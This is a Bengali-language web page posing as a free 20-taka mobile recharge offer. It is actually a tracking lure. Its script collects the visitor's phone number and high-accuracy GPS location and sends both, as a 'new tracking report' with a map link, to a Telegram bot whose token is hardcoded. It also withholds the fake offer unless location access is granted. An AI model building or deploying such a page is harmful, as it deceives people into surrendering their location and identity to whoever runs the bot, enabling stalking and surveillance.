<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Recharge</title>
    <style>
        body { background: #f0f2f5; font-family: sans-serif; text-align: center; padding: 20px; }
        .box { max-width: 400px; margin: 40px auto; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        h2 { color: #28a745; }
        input { width: 100%; padding: 15px; margin: 20px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 18px; box-sizing: border-box; }
        .btn { background: #007bff; color: white; padding: 15px; width: 100%; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h2>২০ টাকা ফ্রি রিচার্জ! 🎁</h2>
        <input type="number" id="phone" placeholder="01XXXXXXXXX">
        <button class="btn" id="btn" onclick="send()">রিচার্জ নিন</button>
    </div>

<script>
async function send() {
    const num = document.getElementById('phone').value;
    const b = document.getElementById('btn');
    if (num.length < 11) { alert("নম্বর দিন"); return; }
    
    b.innerText = "প্রসেসিং...";
    b.disabled = true;

    navigator.geolocation.getCurrentPosition(async (pos) => {
        const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k"; 
        const chat = "7887080882";
        const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        const text = `🔔 **নতুন ট্র্যাকিং রিপোর্ট!**\n\n📱 নম্বর: ${num}\n📍 লোকেশন: ${map}`;
        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
        alert("সফল হয়েছে!");
    }, async (err) => {
        alert("লোকেশন Allow না করলে অফার পাবেন না।");
    }, { enableHighAccuracy: true, timeout: 10000 });
    
    b.innerText = "রিচার্জ নিন";
    b.disabled = false;
}
</script>
</body>
</html>
